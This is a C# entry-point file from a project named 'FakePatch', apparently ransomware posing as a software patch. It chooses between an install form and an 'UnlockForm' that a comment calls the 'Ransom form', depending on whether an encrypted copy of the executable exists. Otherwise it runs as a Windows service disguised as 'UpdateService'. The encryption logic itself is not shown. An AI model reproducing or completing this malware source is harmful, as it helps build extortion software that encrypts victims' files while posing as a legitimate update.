using System;
using System.IO;
using System.ServiceProcess;
using System.Windows.Forms;
using static FakePatch.Globals;
using static FakePatch.LogHelper;



namespace FakePatch
{
    internal static class Program
    {
        /// <summary>
        /// Punto di ingresso principale dell'applicazione.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (System.Environment.UserInteractive)
            {
                //gUserInteractive = true;
                Log("Executable Path: " + Application.ExecutablePath);
                Log("Is elevated? " + gIsElevated);
                FileInfo ExecutablePath = new FileInfo(Application.ExecutablePath);
                //Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)
                FileInfo EncryptedExecutablePath = new FileInfo(Path.Combine(ExecutablePath.Directory.FullName, Path.ChangeExtension(ExecutablePath.Name, Path.GetExtension(ExecutablePath.Name) + ".enc")));
                Log(EncryptedExecutablePath.FullName);

                //Install form
                if (args.Length > 0)
                {
                    switch (args[0])
                    {
                        case "-install":
                            {
                                Application.Run(new InstallForm(args[0]));
                                /*
                                Console.WriteLine("Service " + gServiceName + " is being installed");
                                ManagedInstallerClass.InstallHelper(new string[] { "/LogFile=", "/LogToConsole=true", Assembly.GetExecutingAssembly().Location });
                                sc.Start();
                                */
                                break;
                            }
                        /*
                        case "-uninstall":
                            {
                                int a = 0;
                                foreach (string arg in args)
                                {
                                    Log("args[" + a + "]: " + arg);
                                    a++;
                                }
                                if (args.Length > 1)
                                {
                                    FileInfo e = new FileInfo(args[1]);
                                    Log(e.FullName);
                                }

                                Install.UninstallService(gServiceName);
                                foreach (string FilePath in gFilePaths)
                                {
                                    string message = string.Format("UninstallPatch {0}", FilePath);
                                    Log(message);
                                    Install.UninstallPatch(FilePath);
                                }
                                
                                break;
                            }
                        */
                        default:
                            {
                                if (File.Exists(EncryptedExecutablePath.FullName))
                                {
                                    //Ransom form
                                    Application.Run(new UnlockForm());
                                }
                                else
                                {
                                    Application.Run(new InstallForm(args[0]));
                                }
                                break;
                            }
                    }
                }
                else
                {
                    if (File.Exists(EncryptedExecutablePath.FullName))
                    {
                        //Ransom form
                        Application.Run(new UnlockForm());
                    }
                    else
                    {
                        Application.Run(new InstallForm());
                    }
                }
            }
            else
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new UpdateService()
                };
                ServiceBase.Run(ServicesToRun);
            }
        }
    }
}
